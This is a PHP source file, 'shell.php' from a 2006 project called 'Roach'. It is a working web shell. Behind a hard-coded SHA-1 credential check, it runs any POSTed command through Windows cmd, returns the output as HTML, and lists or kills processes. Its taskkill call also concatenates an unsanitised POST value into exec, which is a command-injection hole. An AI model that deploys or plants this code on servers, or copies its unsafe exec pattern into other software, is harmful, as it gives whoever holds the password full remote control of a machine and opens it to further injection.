<?
/*
	Roach Copyright (C) 2006, Matthew Simpson (graveyardpc@gmail.com) 
	Server Functions (shell.php), Distributed under the BSD License.
*/

// Globals.
$user="d033e22ae348aeb5660fc2140aec35850c4da997";
$pass="df9135d2fa30ca3e14967de29a2d93ead9019c9b";
$uniq=sha1($_SERVER["REMOTE_ADDR"].$user.$pass);

if($_POST["uniq"]==$uniq){
	switch($_POST["ctrl"]){
	case 1:
		echo "Auth:1";
		break;
	case 2:
		switch($_POST["dreq"]){
		case 1:
			echo shellExec($_POST["init"],$_POST["cmd"],$_POST["cwd"]);
			break;
		case 2:
			echo taskExec($_POST["pid"]);
			break;
		}
	}
}

function htmlConv($string){
	$search = array(
			" ",
			"\n");
	$replace = array(
			"&nbsp;",
			"<br/>");
	$string=htmlentities($string);
	$new=str_replace($search,$replace,$string);
	return $new;
}

function shellExec($init,$cmd,$cwd){
	if($init){
		// Start-Up batch.
		$path=substr(__FILE__,0,strrpos(__FILE__,"\\")+1)."start.bat";
		$cmd=	(file_exists($path))?
			"cd /d %systemdrive% && \"".$path."\"":
			"echo.Error: Start-up batch \"start.bat\" is missing. && cd /d %systemdrive%";

		$cwd="\\";
	}else{
		$cmd=stripslashes($cmd);
		$cwd=stripslashes($cwd);	
	}

	$dspec=array(
		0 => array("pipe","r"),
		1 => array("pipe","w"),
		2 => array("pipe","w"));
	$proc=proc_open("cmd",$dspec,$pipes,$cwd);

	if(is_resource($proc)){
		fwrite($pipes[0],"(".$cmd.")");
		fclose($pipes[0]);

		$result.=stream_get_contents($pipes[1]);
		fclose($pipes[1]);
		$error=stream_get_contents($pipes[2]);
		fclose($pipes[2]);
		proc_close($proc);

		// Chop off Microsoft's command line header.
		$result=substr($result,strpos($result,">")+1);

		// Special Character Error.
		if($result=="More? "){$result=	"Error: Command \"".$cmd."\" was not accepted.
						Special characters \"& < > ( ) @ ^ |\" must be used ONLY within
						quotations or with a circumflex accent \"^\" in front of them.
					
						If you were trying to change directories, place the path in
						quotations before trying again!\n\n".$cwd.">";$error="";}

		return htmlConv($error).htmlConv($result);
	}
}

function taskExec($pid){
	if($pid) exec("taskkill.exe /f /pid ".$pid);
	$proc=popen("tasklist.exe /fo csv /nh","r");
	$result=stream_get_contents($proc);
	pclose($proc);
	return htmlConv(substr($result,1));
}
?>